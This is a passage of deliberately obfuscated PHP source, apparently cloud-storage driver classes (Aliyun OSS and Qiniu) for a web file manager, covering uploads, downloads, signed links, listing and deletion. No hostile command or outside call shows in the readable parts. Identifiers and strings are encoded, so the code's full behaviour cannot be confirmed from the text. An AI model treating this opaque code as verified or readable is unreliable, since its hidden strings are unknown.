$ÇÌşïêÀ[$ââ»“–­[222]]); $İí²ÂÇ£ = $Ùßşòüı->getListPart(); $íé¶ÀöŒ = array(); foreach ($İí²ÂÇ£ as $²¦’¶Òõ) { $íé¶ÀöŒ[] = array($ââ»“–­[1402] => $²¦’¶Òõ->getPartNumber(), $ââ»“–­[1403] => trim($²¦’¶Òõ->getETag(), $ââ»“–­[119])); } unset($ì·×Òó[$ââ»“–­[224]], $ì·×Òó[$ââ»“–­[228]]); $ÀäÚ•• = $this->multiUploadAuthData($˜†€®êÏ, $ì·×Òó); if (empty($ÀäÚ••)) { return !1; } return array($ââ»“–­[233] => $ÀäÚ••, $ââ»“–­[223] => $ì·×Òó[$ââ»“–­[223]], $ââ»“–­[235] => $íé¶ÀöŒ); } public function download($³Ãù“Š­, $Üü˜Õíë) { if ($this->isFolder($³Ãù“Š­)) { return !1; } try { $åáıÑè = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Üü˜Õíë); $åáıÑè = $this->trafficLimit($_SERVER[Ôó‡è­ƒ][110], $åáıÑè); $this->client->getObject($this->bucket, $this->pathEncode($³Ãù“Š­), $åáıÑè); } catch (OSS\Core\OssException $¼®Üû) { return !1; } return $Üü˜Õíë; } public function fileSubstr($Ä“ÁÄïë, $¯ÁÜï» = 0, $™õ†Î¯ƒ = false) { if ($¯ÁÜï» === -1) { $üËÚ¦ƒÖ = array(); } else { if ($™õ†Î¯ƒ === !1) { $´ìÌ ¦í = $this->size($Ä“ÁÄïë); } else { $´ìÌ ¦í = $¯ÁÜï» + $™õ†Î¯ƒ - 1; } $üËÚ¦ƒÖ = array(OSS\OssClient::OSS_RANGE => "{$¯ÁÜï»}\55{$´ìÌ ¦í}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ä“ÁÄïë), $üËÚ¦ƒÖ); } catch (OSS\Core\OssException $»™Ïß¹Ë) { think_exception($»™Ïß¹Ë->getMessage()); return !1; } } private function trafficLimit($ŸË¼ª—î, $Á›Œ¦Á = array()) { $˜¸—ØÅ¿ =& $_SERVER[Ôó‡è­ƒ]; if ($ŸË¼ª—î == $˜¸—ØÅ¿[1408] && $this->isUploadServer() || $ŸË¼ª—î == $˜¸—ØÅ¿[110] && $this->isFileOutServer()) { return $Á›Œ¦Á; } $ÙÊçß” = floatval($GLOBALS[$˜¸—ØÅ¿[6]][$˜¸—ØÅ¿[90]][$˜¸—ØÅ¿[108]][$ŸË¼ª—î]) * 1024 * 1024 * 8; if (!$ÙÊçß”) { return $Á›Œ¦Á; } $ÙÊçß” = $ÙÊçß” < 819200 ? 819200 : ($ÙÊçß” > 838860800 ? 838860800 : $ÙÊçß”); $Á›Œ¦Á[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÙÊçß”); return $Á›Œ¦Á; } public function link($Ã¹ğ˜‘õ, $·Ú›Ô„å = array()) { $Ïì²äË =& $_SERVER[Ôó‡è­ƒ]; if (!$this->exist($Ã¹ğ˜‘õ) || $this->isFolder($Ã¹ğ˜‘õ)) { return !1; } try { $·Ú›Ô„å = $this->trafficLimit($Ïì²äË[110], $·Ú›Ô„å); $¾˜¦ş¹‰ = $this->client->signUrl($this->bucket, $this->pathEncode($Ã¹ğ˜‘õ), 3600 * 12, $Ïì²äË[229], $·Ú›Ô„å); return $this->getCdnLink($¾˜¦ş¹‰); } catch (OSS\Core\OssException $¬øç¯Ù÷) { return !1; } } public function fileOut($É·Ò‹¶Â, $í¶“Äá = false, $ãƒæßÄÚ = false, $ßÖá»±ò = '') { $´¡íı–Ò =& $_SERVER[Ôó‡è­ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($É·Ò‹¶Â, $í¶“Äá, $ãƒæßÄÚ, $ßÖá»±ò); } if (!$ãƒæßÄÚ) { $ãƒæßÄÚ = $this->pathThis($É·Ò‹¶Â); } $ãƒæßÄÚ = rawurlencode($ãƒæßÄÚ); $–û’İ± = get_file_mime(get_path_ext($ãƒæßÄÚ)); if ($–û’İ± == $´¡íı–Ò[216]) { return parent::fileOut($É·Ò‹¶Â, $í¶“Äá, $ãƒæßÄÚ, $ßÖá»±ò); } $í¶“Äá = $í¶“Äá ? $´¡íı–Ò[1419] : $´¡íı–Ò[1420]; $ñ¨“Ô˜è = array(OSS\OssClient::OSS_SUB_RESOURCE => $´¡íı–Ò[1421] . rawurlencode("{$í¶“Äá}\x3b\x66\x69\154\145\156\141\x6d\x65\x3d{$ãƒæßÄÚ}")); $ñ¨“Ô˜è[OSS\OssClient::OSS_SUB_RESOURCE] .= $´¡íı–Ò[1422] . rawurlencode($–û’İ±); $·Ş¡¯£ì = $this->link($É·Ò‹¶Â, $ñ¨“Ô˜è); $this->fileOutLink($·Ş¡¯£ì); } public function fileOutServer($ä¨ËâÛÎ, $æÎ¤²öò = false, $Šš„«ËÄ = false, $™ÇÙ¶ä = '') { parent::fileOut($ä¨ËâÛÎ, $æÎ¤²öò, $Šš„«ËÄ, $™ÇÙ¶ä); } public function fileOutImage($ùÙªğöÏ, $ˆÛöÇ±­ = 250) { $è®§©¨Ì = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ôó‡è­ƒ][1423] . $ˆÛöÇ±­); $ßœóßòí = $this->link($ùÙªğöÏ, $è®§©¨Ì); $this->fileOutLink($ßœóßòí); } public function fileOutImageServer($ÚµÑ•ØŒ, $Ìïöô¹¼ = 250) { parent::fileOutImage($ÚµÑ•ØŒ, $Ìïöô¹¼); } public function fileOutLink($ô—»Üœ‚) { $·¦Ê¯¢• =& $_SERVER[Ôó‡è­ƒ]; if (!$this->isCdnHost() && substr($ô—»Üœ‚, 0, 7) == $·¦Ê¯¢•[1323]) { $ô—»Üœ‚ = $·¦Ê¯¢•[1324] . substr($ô—»Üœ‚, 7); } header($·¦Ê¯¢•[162] . $ô—»Üœ‚); die; } public function hashMd5($Î‘ƒ®şÍ, $ƒÔİõ¢™ = '') { $ÜšæÚåŠ =& $_SERVER[Ôó‡è­ƒ]; $ä…ÅÉä¾ = $this->_objectMeta($Î‘ƒ®şÍ); if (!$ä…ÅÉä¾) { return $ÜšæÚåŠ[12]; } if (!isset($ä…ÅÉä¾[$ÜšæÚåŠ[1398]]) && !empty($ƒÔİõ¢™)) { $ä£ÊÈ«Å = $this->updateObjMeta($Î‘ƒ®şÍ, array($ÜšæÚåŠ[1398] => $ƒÔİõ¢™)); $ä…ÅÉä¾[$ÜšæÚåŠ[1398]] = $ä£ÊÈ«Å ? $ƒÔİõ¢™ : $ÜšæÚåŠ[12]; } return isset($ä…ÅÉä¾[$ÜšæÚåŠ[1398]]) ? strtolower($ä…ÅÉä¾[$ÜšæÚåŠ[1398]]) : $ÜšæÚåŠ[12]; } public function size($Éü¾èÇş) { $‘ô·ùªë = $this->objectMeta($Éü¾èÇş); return $‘ô·ùªë ? $‘ô·ùªë[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function info($Ôî¼³ä½) { if ($this->isFolder($Ôî¼³ä½)) { return $this->folderInfo($Ôî¼³ä½); } else { if ($this->isFile($Ôî¼³ä½)) { return $this->fileInfo($Ôî¼³ä½); } } return !1; } public function exist($‹¸Úöİ‘) { return $this->isFile($‹¸Úöİ‘) || $this->isFolder($‹¸Úöİ‘); } public function isFile($¤é•Øú) { return !$this->isFolder($¤é•Øú) && $this->objectMeta($¤é•Øú); } public function isFolder($ö¨ü®®¹) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][202], $ö¨ü®®¹); } protected function objectMeta($ÔÒ¾İç¶) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][203], $ÔÒ¾İç¶); } protected function _objectMeta($¶È¹ì’³) { $¸ƒ¡Îøº =& $_SERVER[Ôó‡è­ƒ]; try { $»²Ş÷óÌ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¶È¹ì’³)); } catch (OSS\Core\OssException $Ï²¶„¾) { $»²Ş÷óÌ = !1; } if ($»²Ş÷óÌ) { $»²Ş÷óÌ[$¸ƒ¡Îøº[80]] = intval($»²Ş÷óÌ[$¸ƒ¡Îøº[1396]]); } return $»²Ş÷óÌ; } protected function _isFolder($¼†¥ ¿Š) { $Ú×ãÛá =& $_SERVER[Ôó‡è­ƒ]; if ($¼†¥ ¿Š == $Ú×ãÛá[12] || $¼†¥ ¿Š == $Ú×ãÛá[8]) { return !0; } $—¤Àœö± = array($Ú×ãÛá[1392] => $Ú×ãÛá[8], $Ú×ãÛá[1393] => rtrim($¼†¥ ¿Š, $Ú×ãÛá[8]) . $Ú×ãÛá[8], $Ú×ãÛá[1394] => 1, $Ú×ãÛá[1395] => $Ú×ãÛá[12]); $š»ıĞæù = $this->client->listObjects($this->bucket, $—¤Àœö±); if ($š»ıĞæù->getObjectList() || $š»ıĞæù->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($˜êúŞ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ôó‡è­ƒ][1424]; $this->_init($˜êúŞ); } public function _init($†‚à©ªÄ) { $€ÂŒ‰º =& $_SERVER[Ôó‡è­ƒ]; foreach ($†‚à©ªÄ as $İóšüÈ­ => $ïäòÚ´Ö) { if (isset($this->{$İóšüÈ­})) { $this->{$İóšüÈ­} = $ïäòÚ´Ö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($€ÂŒ‰º[1425] . LNG($€ÂŒ‰º[1383])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÍÁ³Œ, $ÖÆšÃº¼ = '', $¿Ãª¹¿Ü = REPEAT_RENAME) { if ($this->setContent($ÍÁ³Œ, $ÖÆšÃº¼)) { return $this->getPathOuter($ÍÁ³Œ); } return !1; } public function mkdir($Â«¢¼´±, $À”±î»¯ = REPEAT_SKIP) { $úØ²Ğñ =& $_SERVER[Ôó‡è­ƒ]; $ºéÒ‹í€ = trim($Â«¢¼´±, $úØ²Ğñ[8]); if ($this->_isFolder($ºéÒ‹í€)) { return $this->getPathOuter($ºéÒ‹í€); } $Â«¢¼´± = $ºéÒ‹í€ . $úØ²Ğñ[8]; $–±úíü³ = get_path_this($ºéÒ‹í€); $øÁû›š² = $Â«¢¼´± . $–±úíü³; if (!$this->mkfile($øÁû›š²)) { return !1; } if (!$this->moveFile($øÁû›š², $Â«¢¼´±)) { $this->delFile($øÁû›š²); return !1; } return $this->getPathOuter($ºéÒ‹í€); } public function copyFile($ı’ˆë, $¦Ø†ÌÄ–) { $÷Ğğş¥ = $this->bucketManager->copy($this->bucket, $ı’ˆë, $this->bucket, $¦Ø†ÌÄ–, !0); return $÷Ğğş¥ ? !1 : $this->getPathOuter($¦Ø†ÌÄ–); } public function moveFile($Â“Ãüñ, $ô¥¤İ“¶) { $®ÓòÉ¢Å = $this->bucketManager->move($this->bucket, $Â“Ãüñ, $this->bucket, $ô¥¤İ“¶, !0); return $®ÓòÉ¢Å ? !1 : $this->getPathOuter($ô¥¤İ“¶); } public function delFile($½ã²Ğºƒ) { if (!$this->exist($½ã²Ğºƒ)) { return !0; } $œ×é°—È = $this->bucketManager->delete($this->bucket, $½ã²Ğºƒ); return $œ×é°—È ? !1 : !0; } public function delFolder($ºçÖ•ß¯) { $¦‹íø—ã =& $_SERVER[Ôó‡è­ƒ]; if (!$this->exist($ºçÖ•ß¯)) { return !0; } $this->listItemCache = !1; $‰Šñæø… = $this->fileList($ºçÖ•ß¯); $this->listItemCache = !0; $À¸Ë´Ë = trim($ºçÖ•ß¯, $¦‹íø—ã[8]) . $¦‹íø—ã[8]; if (!empty($ºçÖ•ß¯) && $ºçÖ•ß¯ !== $¦‹íø—ã[194] && !in_array($À¸Ë´Ë, $‰Šñæø…[$¦‹íø—ã[77]])) { $‰Šñæø…[$¦‹íø—ã[77]][] = $À¸Ë´Ë; } $¶Í‡Š— = $this->delByBatch($‰Šñæø…[$¦‹íø—ã[76]]); if (!$¶Í‡Š—) { return !1; } $¶Í‡Š— = $this->delByBatch($‰Šñæø…[$¦‹íø—ã[77]]); if (!$¶Í‡Š—) { return !1; } return $this->delFile($À¸Ë´Ë); } private function delByBatch($˜ÅîØøÙ) { foreach (array_chunk($˜ÅîØøÙ, 1000) as $€İà³™¦) { $Ç¸¡ÕÁş = $this->bucketManager->buildBatchDelete($this->bucket, $€İà³™¦); list($¯·€„—…, $›¼û¡) = $this->bucketManager->batch($Ç¸¡ÕÁş); if ($›¼û¡) { return !1; } } return !0; } public function rename($¯íá¦Šş, $¬ùõõ¸) { return $this->renameObject($¯íá¦Šş, $¬ùõõ¸); } public function fileInfo($ä¯Óçêü, $Ñìµ™Ë› = false, $äÍÖõÆ¥ = array()) { $¿­“‡º =& $_SERVER[Ôó‡è­ƒ]; $Û÷‰Œæı = array($¿­“‡º[32] => $this->pathThis($ä¯Óçêü), $¿­“‡º[78] => $this->getPathOuter($¿­“‡º[8] . $ä¯Óçêü), $¿­“‡º[33] => $¿­“‡º[196], $¿­“‡º[80] => isset($äÍÖõÆ¥[$¿­“‡º[1426]]) ? $äÍÖõÆ¥[$¿­“‡º[1426]] : 0, $¿­“‡º[171] => $this->ext($ä¯Óçêü)); if ($Ñìµ™Ë›) { return $Û÷‰Œæı; } $Û÷‰Œæı[$¿­“‡º[197]] = $Û÷‰Œæı[$¿­“‡º[86]] = 0; $Û÷‰Œæı[$¿­“‡º[198]] = $Û÷‰Œæı[$¿­“‡º[199]] = !0; if (empty($äÍÖõÆ¥)) { $äÍÖõÆ¥ = $this->objectMeta($ä¯Óçêü); if (!$äÍÖõÆ¥) { return $Û÷‰Œæı; } } if (isset($äÍÖõÆ¥[$¿­“‡º[1427]])) { $Û÷‰Œæı[$¿­“‡º[86]] = substr($äÍÖõÆ¥[$¿­“‡º[1427]] . $¿­“‡º[12], 0, 10); } if (isset($äÍÖõÆ¥[$¿­“‡º[1426]])) { $Û÷‰Œæı[$¿­“‡º[80]] = $äÍÖõÆ¥[$¿­“‡º[1426]]; } return $Û÷‰Œæı; } public function folderInfo($™©ëµ‚, $ã±›Ÿß = false) { $­€È´‘Œ =& $_SERVER[Ôó‡è­ƒ]; $šÓ¬äËÙ = array($­€È´‘Œ[32] => $this->pathThis($™©ëµ‚), $­€È´‘Œ[78] => $this->getPathOuter($­€È´‘Œ[8] . $™©ëµ‚), $­€È´‘Œ[33] => $­€È´‘Œ[79]); if ($ã±›Ÿß) { return $šÓ¬äËÙ; } $šÓ¬äËÙ[$­€È´‘Œ[197]] = $šÓ¬äËÙ[$­€È´‘Œ[86]] = 0; $šÓ¬äËÙ[$­€È´‘Œ[198]] = $šÓ¬äËÙ[$­€È´‘Œ[199]] = !0; $™©ëµ‚ = rtrim($™©ëµ‚, $­€È´‘Œ[8]) . $­€È´‘Œ[8]; $î‰øÔÓÜ = $this->objectMeta($™©ëµ‚); if (isset($î‰øÔÓÜ[$­€È´‘Œ[1427]])) { $šÓ¬äËÙ[$­€È´‘Œ[86]] = substr($î‰øÔÓÜ[$­€È´‘Œ[1427]] . $­€È´‘Œ[12], 0, 10); } return $šÓ¬äËÙ; } public function listPath($”¼ÌšØâ, $Ü¦¿ı— = false) { $¥«‡İÄö =& $_SERVER[Ôó‡è­ƒ]; $Í‚Çİœµ = $this->fileList($”¼ÌšØâ, $¥«‡İÄö[8], !0); foreach ($Í‚Çİœµ[$¥«‡İÄö[77]] as $§ß³¬¢ç => $Ş‘ÆÃ©ç) { $Í‚Çİœµ[$¥«‡İÄö[77]][$§ß³¬¢ç] = $this->folderInfo($Ş‘ÆÃ©ç, $Ü¦¿ı—); } foreach ($Í‚Çİœµ[$¥«‡İÄö[76]] as $§ß³¬¢ç => $Ş‘ÆÃ©ç) { $Í‚Çİœµ[$¥«‡İÄö[76]][$§ß³¬¢ç] = $this->fileInfo($Ş‘ÆÃ©ç[$¥«‡İÄö[95]], $Ü¦¿ı—, $Ş‘ÆÃ©ç); } return $Í‚Çİœµ; } public function has($¤á¿¢ç—, $Ò³É¼‚Œ = false, $—±ì§á = true) { $ãéÙœˆ‰ =& $_SERVER[Ôó‡è­ƒ]; $¤á¿¢ç— = trim($¤á¿¢ç—, $ãéÙœˆ‰[8]); $•„ªªÏ = empty($¤á¿¢ç—) && $¤á¿¢ç— !== $ãéÙœˆ‰[194] ? $ãéÙœˆ‰[12] : $¤á¿¢ç— . $ãéÙœˆ‰[8]; $Î÷íî”Û = $ãéÙœˆ‰[12]; $Ïş×¢×¶ = 500; $µã„Îì¼ = $ãéÙœˆ‰[8]; $Â»Ï¶¹ = $ì®¹û¸ª = 0; while (!0) { check_abort(); list($Í¼¬õ¥, $™çïÆşñ) = $this->bucketManager->listFiles($this->bucket, $•„ªªÏ, $Î÷íî”Û, $Ïş×¢×¶, $µã„Îì¼); if ($™çïÆşñ) { break; } $Î÷íî”Û = array_key_exists($ãéÙœˆ‰[1395], $Í¼¬õ¥) ? $Î÷íî”Û = $Í¼¬õ¥[$ãéÙœˆ‰[1428]] : $ãéÙœˆ‰[12]; if ($Ò³É¼‚Œ) { if (!empty($Í¼¬õ¥[$ãéÙœˆ‰[1429]])) { $Â»Ï¶¹ += count($Í¼¬õ¥[$ãéÙœˆ‰[1429]]); } if (!empty($Í¼¬õ¥[$ãéÙœˆ‰[1430]])) { $ì®¹û¸ª += count($Í¼¬õ¥[$ãéÙœˆ‰[1430]]); } if ($Î÷íî”Û === $ãéÙœˆ‰[12]) { break; } continue; } if ($—±ì§á) { if (!empty($Í¼¬õ¥[$ãéÙœˆ‰[1429]])) { return !0; } } else { if (!empty($Í¼¬õ¥[$ãéÙœˆ‰[1430]])) { return !0; } } if ($Î÷íî”Û === $ãéÙœˆ‰[12]) { break; } } if ($Ò³É¼‚Œ) { return array($ãéÙœˆ‰[206] => $Â»Ï¶¹, $ãéÙœˆ‰[207] => $ì®¹û¸ª); } return !1; } public function listAll($øøÇİµÔ) { $¹†»òØ =& $_SERVER[Ôó‡è­ƒ]; $ç³ìêö = $this->fileList($øøÇİµÔ, $¹†»òØ[12], !0); $§¢µ‰È“ = array(); foreach ($ç³ìêö[$¹†»òØ[76]] as $ÎÆåäÒú) { $§¢µ‰È“[$ÎÆåäÒú[$¹†»òØ[95]]] = $ÎÆåäÒú[$¹†»òØ[80]]; } foreach ($ç³ìêö[$¹†»òØ[77]] as $ÎÆåäÒú) { if (is_string($ÎÆåäÒú)) { $§¢µ‰È“[$ÎÆåäÒú] = 0; } } return $this->listAllFiles($øøÇİµÔ, array_keys($§¢µ‰È“), $§¢µ‰È“); } private function fileList($÷îº“„ª, $èÊ»ÇÇ = '', $—œ‘ôÉ = 0) { $è˜ŠŸ±¢ =& $_SERVER[Ôó‡è­ƒ]; $÷îº“„ª = trim($÷îº“„ª, $è˜ŠŸ±¢[8]); $ÇŠ‡¦Œ = empty($÷îº“„ª) && $÷îº“„ª !== $è˜ŠŸ±¢[194] ? $è˜ŠŸ±¢[12] : $÷îº“„ª . $è˜ŠŸ±¢[8]; $Ù´Š«… = $è˜ŠŸ±¢[12]; $ÇÒš…åÔ = 1000; $É¼ğÏÚÂ = $this->listItemCache === !1 ? !1 : !0; $Œ³æíâı = $‚ü¦„õÕ = array(); while (!0) { check_abort(); list($×ªº› š, $Àì¹ÔõÁ) = $this->bucketManager->listFiles($this->bucket, $ÇŠ‡¦Œ, $Ù´Š«…, $ÇÒš…åÔ, $èÊ»ÇÇ); if ($Àì¹ÔõÁ) { break; } $Ù´Š«… = array_key_exists($è˜ŠŸ±¢[1395], $×ªº› š) ? $Ù´Š«… = $×ªº› š[$è˜ŠŸ±¢[1428]] : $è˜ŠŸ±¢[12]; $œ‘Í¨…Ç = isset($×ªº› š[$è˜ŠŸ±¢[1429]]) ? $×ªº› š[$è˜ŠŸ±¢[1429]] : array(); $ªŸû“¤Í = isset($×ªº› š[$è˜ŠŸ±¢[1430]]) ? $×ªº› š[$è˜ŠŸ±¢[1430]] : array(); foreach ($œ‘Í¨…Ç as $ª±–’) { if ($ª±–’[$è˜ŠŸ±¢[95]] == $ÇŠ‡¦Œ) { continue; } $íüÒ¿£¾ = $ª±–’[$è˜ŠŸ±¢[95]]; $œ¼÷çİÇ = $ª±–’[$è˜ŠŸ±¢[1426]]; $ª±–’[$è˜ŠŸ±¢[80]] = $œ¼÷çİÇ; $ÜÉõØÖˆ = $œ¼÷çİÇ == 0 && substr($íüÒ¿£¾, strlen($íüÒ¿£¾) - 1, 1) == $è˜ŠŸ±¢[8] ? !0 : !1; if ($É¼ğÏÚÂ) { $this->cacheMethod($è˜ŠŸ±¢[202], $íüÒ¿£¾, $ÜÉõØÖˆ); $this->cacheMethod($è˜ŠŸ±¢[203], $íüÒ¿£¾, $ª±–’); } if ($ÜÉõØÖˆ) { $Œ³æíâı[] = $íüÒ¿£¾; continue; } $‚ü¦„õÕ[] = $—œ‘ôÉ ? $ª±–’ : $íüÒ¿£¾; } foreach ($ªŸû“¤Í as $íüÒ¿£¾) { if ($íüÒ¿£¾ == $ÇŠ‡¦Œ) { continue; } $Œ³æíâı[] = $íüÒ¿£¾; if ($É¼ğÏÚÂ) { $this->cacheMethod($è˜ŠŸ±¢[202], $íüÒ¿£¾, !0); } } if ($Ù´Š«… === $è˜ŠŸ±¢[12]) { break; } } if ($É¼ğÏÚÂ) { $this->cacheMethod($è˜ŠŸ±¢[202], $÷îº“„ª, !0); } return array($è˜ŠŸ±¢[77] => $Œ³æíâı, $è˜ŠŸ±¢[76] => $‚ü¦„õÕ); } public function canRead($ûÓÅˆø) { return $this->exist($ûÓÅˆø) ? !0 : !1; } public function canWrite($çêÍ€ì) { return $this->exist($çêÍ€ì) ? !0 : !1; } public function getContent($ÓâµÄİø) { return $this->fileSubstr($ÓâµÄİø, 0, -1); } public function setContent($òƒÔ¢İ’, $ªíÂÒ¼® = '') { $û¬İş²á = $this->tempFile($this->pathThis($òƒÔ¢İ’)); file_put_contents($û¬İş²á, $ªíÂÒ¼®); if ($this->upload($òƒÔ¢İ’, $û¬İş²á)) { $this->tempFileRemve($û¬İş²á); return !0; } return !1; } public function refreshUrls($ïÙà÷¾×) { $Ç…Â©Š” =& $_SERVER[Ôó‡è­ƒ]; $©æ¼‰˜å = array(); if (is_array($ïÙà÷¾×)) { foreach ($ïÙà÷¾× as $Œ§Óóü) { $©æ¼‰˜å[] = $this->link($Œ§Óóü); } } else { $©æ¼‰˜å[] = $this->link($ïÙà÷¾×); } $ƒıÍ˜Üü = new Qiniu\Cdn\CdnManager($this->auth); list($òø…‰–, $óê¹§Ú) = $ƒıÍ˜Üü->refreshUrls($©æ¼‰˜å); if ($óê¹§Ú) { return !1; } return $òø…‰–[$Ç…Â©Š”[1181]] == $Ç…Â©Š”[758] ? !0 : !1; } public function fileSubstr($Ë¤´‡à–, $¬––÷Éí, $ö³§ÕÎĞ) { $Øú×¡¾‹ =& $_SERVER[Ôó‡è­ƒ]; if (!($º°§ó§¡ = $this->link($Ë¤´‡à–))) { return !1; } $‰Ã‹ô¡˜ = !1; if ($ö³§ÕÎĞ > 0) { $‹ÖÂÜò = $¬––÷Éí + $ö³§ÕÎĞ - 1; $‰Ã‹ô¡˜ = array($Øú×¡¾‹[1431] . $¬––÷Éí . $Øú×¡¾‹[456] . $‹ÖÂÜò); } $§‚šÎá­ = url_request($º°§ó§¡, $Øú×¡¾‹[229], !1, $‰Ã‹ô¡˜); return $§‚šÎá­[$Øú×¡¾‹[748]] ? $§‚šÎá­[$Øú×¡¾‹[1191]] : !1; } public function upload($¿˜‰†Å, $šÜ„«², $ø™àŞê = false, $¼šŞ‘á³ = REPEAT_REPLACE) { $ßì²”•İ = new Qiniu\Storage\UploadManager(); $®Øƒ“¦ = $this->auth->uploadToken($this->bucket, $¿˜‰†Å); $£ûç€Ë = get_file_mime(get_path_ext($šÜ„«²)); list($ìğ€Ÿ—†, $½Ş¨¼ú²) = $ßì²”•İ->putFile($®Øƒ“¦, $¿˜‰†Å, $šÜ„«², null, $£ûç€Ë); return $½Ş¨¼ú² ? !1 : $this->getPathOuter($¿˜‰†Å); } public function uploadFormData($›åñ¼Óú, $ì†¦£‹Å = 3600) { return $this->uploadToken($›åñ¼Óú, $ì†¦£‹Å); } public function multiUploadFormData($—üÔ³œ­, $ÑÕÔËÕ = 3600) { return $this->uploadToken($—üÔ³œ­, $ÑÕÔËÕ); } private function uploadToken($ÎÈÉ, $©å–À³Â = 3600) { $¶¨¤åàÕ =& $_SERVER[Ôó‡è­ƒ]; $©ìº‡¦° = $©å–À³Â; $®Ãëşô¹ = array($¶¨¤åàÕ[1432] => $¶¨¤åàÕ[1433]); $çœ§ĞÕ™ = $ÎÈÉ; $Œ§¿›ó = $this->auth->uploadToken($this->bucket, $çœ§ĞÕ™, $©ìº‡¦°, $®Ãëşô¹, !0); $ˆˆäÁè° = empty($this->region) || $this->region == $¶¨¤åàÕ[1434] ? $¶¨¤åàÕ[12] : $¶¨¤åàÕ[456] . $this->region; $­í§Ì­¾ = http_type() . "\72\57\57\165\160\x6c\157\x61\x64{$ˆˆäÁè°}\56\161\151\x6e\x69\165\x70\56\143\157\x6d\57"; return array($¶¨¤åàÕ[1435] => $Œ§¿›ó, $¶¨¤åàÕ[1436] => $­í§Ì­¾); } public function download($³—‡µÇô, $€éÀ­»’) { $Å©‘†œ¼ = IO::getPathInner(IO::mkfile($€éÀ­»’)); if (!($¹õäƒÎ = $this->link($³—‡µÇô))) { return !1; } $Î°î°»Æ = 0; $Ú˜Ã·çë = 1024 * 200; $åó¹…°ô = fopen($Å©‘†œ¼, $_SERVER[Ôó‡è­ƒ][1437]); while (!0) { $ë·Œô‡“ = $this->fileSubstr($³—‡µÇô, $Î°î°»Æ, $Ú˜Ã·çë); if ($ë·Œô‡“ === !1) { return !1; } fwrite($åó¹…°ô, $ë·Œô‡“); $Î°î°»Æ += $Ú˜Ã·çë; if (strlen($ë·Œô‡“) < $Ú˜Ã·çë) { break; } } fclose($åó¹…°ô); return $€éÀ­»’; } public function link($¤³›ä…, $Ü“”å¯ô = '') { if (!$this->isFile($¤³›ä…)) { return !1; } $Ï°¯«½§ = $this->getHost() . $_SERVER[Ôó‡è­ƒ][8] . $this->pathEncode($¤³›ä…) . $Ü“”å¯ô; return $this->auth->privateDownloadUrl($Ï°¯«½§, 3600 * 12); } public function fileOut($ÂĞ€š”, $‹”÷à¨£ = false, $‚ô–Ôş = false, $´“ğÒ§ = '') { $À«¶É÷ =& $_SERVER[Ôó‡è­ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÂĞ€š”, $‹”÷à¨£, $‚ô–Ôş, $´“ğÒ§); } if (!$‚ô–Ôş) { $‚ô–Ôş = $this->pathThis($ÂĞ€š”); } $×ª¡Úã‰ = $‹”÷à¨£ ? $À«¶É÷[1438] . rawurlencode($‚ô–Ôş) : $À«¶É÷[12]; $´á»Ñ‹› = $this->link($ÂĞ€š”, $×ª¡Úã‰); $this->fileOutLink($´á»Ñ‹›); } public function fileOutServer($Ì±…Á·î, $œ³—ÙùŒ = false, $ƒ¸¼£½š = false, $âéĞğ× = '') { parent::fileOut($Ì±…Á·î, $œ³—ÙùŒ, $ƒ¸¼£½š, $âéĞğ×); } public function fileOutImage($µ’š´Âè, $‰òá‡¯ = 250) { $€úğ¾ • = $this->link($µ’š´Âè, $_SERVER[Ôó‡è­ƒ][1439] . $‰òá‡¯); $this->fileOutLink($€úğ¾ •); } public function fileOutImageServer($µ¯÷Ì¸, $„×…€á– = 250) { parent::fileOutImage($µ¯÷Ì¸, $„×…€á–); } public function hashMd5($İ ­€) { $í™Ÿë‰“ =& $_SERVER[Ôó‡è­ƒ]; $§ãù¬ˆ… = $this->objectMeta($İ ­€); return isset($§ãù¬ˆ…[$í™Ÿë‰“[211]]) ? $§ãù¬ˆ…[$í™Ÿë‰“[211]] : !1; $·Ó«Ü·µ = $this->link($İ ­€, $í™Ÿë‰“[1440]); } public function size($ëğ’ø¼õ) { $®“µ•‰û = $this->objectMeta($ëğ’ø¼õ); return $®“µ•‰û ? $®“µ•‰û[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function info($Ö’¡Îµã) { if ($this->isFolder($Ö’¡Îµã)) { return $this->folderInfo($Ö’¡Îµã); } else { if ($this->isFile($Ö’¡Îµã)) { return $this->fileInfo($Ö’¡Îµã); } } return !1; } public function exist($Ï¨ĞÓ¡) { return $this->isFile($Ï¨ĞÓ¡) || $this->isFolder($Ï¨ĞÓ¡); } public function isFile($ñúôûã‘) { return !$this->isFolder($ñúôûã‘) && $this->objectMeta($ñúôûã‘); } public function isFolder($—óğã¯º) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][202], $—óğã¯º); } protected function objectMeta($÷Ê‚“Š) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][203], $÷Ê‚“Š); } protected function _objectMeta($‘ŞôØÅ) { $¾Úõş¡í =& $_SERVER[Ôó‡è­ƒ]; list($ÄÅÄ©µş, $ëòÄï¿¬) = $this->bucketManager->stat($this->bucket, $‘ŞôØÅ); if ($ÄÅÄ©µş) { $ÄÅÄ©µş[$¾Úõş¡í[80]] = intval($ÄÅÄ©µş[$¾Úõş¡í[1426]]); } return $ÄÅÄ©µş; } protected function _isFolder($Ş×Ù…í˜) { $·¢„ıõ =& $_SERVER[Ôó‡è­ƒ]; if 